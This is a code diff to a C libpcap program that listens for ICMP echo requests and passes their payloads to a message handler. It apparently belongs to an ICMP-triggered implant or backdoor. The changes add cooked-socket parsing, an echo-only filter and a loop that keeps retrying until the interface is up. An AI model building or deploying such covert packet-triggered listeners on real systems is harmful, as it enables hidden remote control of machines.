@@ -331,6 +331,7 @@ void process_message(const unsigned char *data, uint32_t size, const struct ip_h
 	uint8_t msg_type = 0;
    pid_t pid;
    int status =0;
+
 	// Make sure we have data
 	if(size > 0) {
 
@@ -391,17 +392,23 @@ void process_packet(u_char *user_data, const struct pcap_pkthdr *hdr, const u_ch
 	const struct icmp_hdr *icmp = NULL;
 	uint32_t size_ip, size_icmp;//, size_data;
 	const unsigned char *data = NULL;
+  uint32_t encap_size = SIZE_ETHERNET;
+
+  // For cooked sockets this size will be different
+  if(data_type == 113) {
+    encap_size = 16;
+  }
 
 	// IP
-	ip = (struct ip_hdr *)(pkt + SIZE_ETHERNET);
+	ip = (struct ip_hdr *)(pkt + encap_size);
 	size_ip = ((ip->ip_header_len & 0x0f) * 4);
 	
 	// ICMP
-	icmp = (struct icmp_hdr *)(pkt + SIZE_ETHERNET + size_ip);
+	icmp = (struct icmp_hdr *)(pkt + encap_size + size_ip);
 	size_icmp = sizeof(struct icmp_hdr);
 
 	// Data
-	data = (unsigned char *)(pkt + SIZE_ETHERNET + size_ip + size_icmp);
+	data = (unsigned char *)(pkt + encap_size + size_ip + size_icmp);
 
 	// Only want to deal with icmp echo requests
 	if((icmp->type == 8) && (icmp->code == 0)) {
@@ -413,8 +420,7 @@ int main(int argc, char **argv) {
 	pcap_t *handle = NULL;
 	char errbuf[PCAP_ERRBUF_SIZE];
 	struct bpf_program fp;
-	bpf_u_int32 mask, net;
-	char bpf_filter[] = "icmp";
+	char bpf_filter[] = "icmp and icmp[icmptype] == 8";
   char *interface = (char *)INTERFACE;
 
 	// Seed random for later
@@ -425,26 +431,17 @@ int main(int argc, char **argv) {
     interface = argv[1];
   }
 
-	// Opening the pcap device
-	if((handle = pcap_open_live(interface, BUFSIZ, 0, 1000, errbuf)) == NULL) {
+	// Opening the pcap device - Keep trying if the interface isn't up
+	while((handle = pcap_open_live(interface, BUFSIZ, 0, 1000, errbuf)) == NULL) {
 		DEBUG_WRAP(fprintf(stderr, "Error opening device %s: %s\n", interface, errbuf));
-		return -1;
+    sleep(1);
 	}
 
-	// Need some extra information about the network interface
-	if(pcap_lookupnet(interface, &net, &mask, errbuf)) {
-		DEBUG_WRAP(fprintf(stderr, "Error getting interface information for %s: %s\n", interface, errbuf));
-		return -1;
-	}
-
-	// Make sure we got information
-	if((mask == 0) || (net == 0)) {
-		DEBUG_WRAP(fprintf(stderr, "Error getting interface information for %s\n", interface));
-		return -1;
-	}
-
+  data_type = pcap_datalink(handle);
+  DEBUG_WRAP(fprintf(stderr, "Datalink Type: %d\n", data_type));
+  
 	// We only want to see ICMP traffic
-	if(pcap_compile(handle, &fp, bpf_filter, 0, mask)) {
+	if(pcap_compile(handle, &fp, bpf_filter, 0, PCAP_NETMASK_UNKNOWN)) {
 		DEBUG_WRAP(fprintf(stderr, "Error compiling bpf filter '%s': %s\n", bpf_filter, pcap_geterr(handle)));
 		return -1;
 	}
